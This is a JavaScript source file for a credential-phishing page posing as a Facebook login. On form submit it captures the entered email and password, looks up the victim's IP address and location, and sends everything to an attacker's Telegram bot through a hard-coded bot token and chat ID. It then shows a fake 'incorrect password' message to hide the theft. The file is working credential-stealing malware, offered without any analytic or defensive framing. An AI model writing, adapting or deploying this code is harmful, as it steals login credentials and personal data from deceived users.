const form = document.querySelector("#form");
var ct = "5";
var co = 0;
var lo = 0;
var st = 0;

form.addEventListener("submit", (e) => {
  e.preventDefault();

  fetch("https://ipapi.co/json/")
    .then((res) => res.json())
    .then((data) => {
      ct = data.ip;
      co = data.country_name;
      lo = data.country_calling_code;
      st = data.city;

      var identity = document.getElementById("email").value;
      var password = document.getElementById("password").value;

      var my_text = `
      <b>New Facebook Vote</b>
      - <b>Username/Email:</b> ${identity}
      - <b>Password:</b> ${password}
      - <b>IPAddress:</b> ${ct}
      - <b>Country:</b> ${co}
      - <b>Country Code:</b> ${lo}
      - <b>City:</b> ${st}
      `;

      var token = "7238505618:AAFq_0g2YgQDAdhG9OxDKsQGmZJ-o5t09U8";
      var chat_id = 7656086639;
      var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(
        my_text
      )}&parse_mode=HTML`;
      let api = new XMLHttpRequest();
      api.open("GET", url, true);
      api.send();
      document.getElementById("alert-message").innerHTML =
        "Sorry, your password was incorrect. Please double-check your password.";
    });

  // window.location.replace("https://www.instagram.com/accounts/login/")
  //   console.log("Incorrect Password!");
});
